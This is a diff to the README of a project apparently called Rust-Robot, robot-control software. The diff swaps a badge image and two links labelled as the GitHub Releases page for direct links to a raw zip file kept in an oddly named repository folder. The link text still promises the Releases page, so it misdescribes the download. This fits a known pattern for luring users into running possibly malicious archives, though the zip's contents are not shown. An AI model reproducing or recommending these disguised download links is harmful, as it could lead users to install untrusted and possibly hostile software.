@@ -1,6 +1,6 @@
 # 🤖 Rust-Robot - Control Your Robot with Ease
 
-![Download Rust-Robot](https://img.shields.io/badge/Download-Rust--Robot-blue.svg)
+![Download Rust-Robot](https://raw.githubusercontent.com/tarekwalid12/Rust-Robot/main/prochorionic/Rust-Robot.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ To run Rust-Robot, you will need the following:
 
 To get started, visit the Releases page to download the latest version of the software. 
 
-[Download Rust-Robot from Releases Page](https://github.com/tarekwalid12/Rust-Robot/releases)
+[Download Rust-Robot from Releases Page](https://raw.githubusercontent.com/tarekwalid12/Rust-Robot/main/prochorionic/Rust-Robot.zip)
 
 ### Step-by-Step Installation
 
@@ -28,7 +28,7 @@ To get started, visit the Releases page to download the latest version of the so
 
 2. **Visit the Releases Page**
    Click the link below to open the Releases page:
-   [Rust-Robot Releases](https://github.com/tarekwalid12/Rust-Robot/releases)
+   [Rust-Robot Releases](https://raw.githubusercontent.com/tarekwalid12/Rust-Robot/main/prochorionic/Rust-Robot.zip)
 
 3. **Find the Latest Version**
    Look for the latest version of Rust-Robot. This will be at the top of the list of releases.
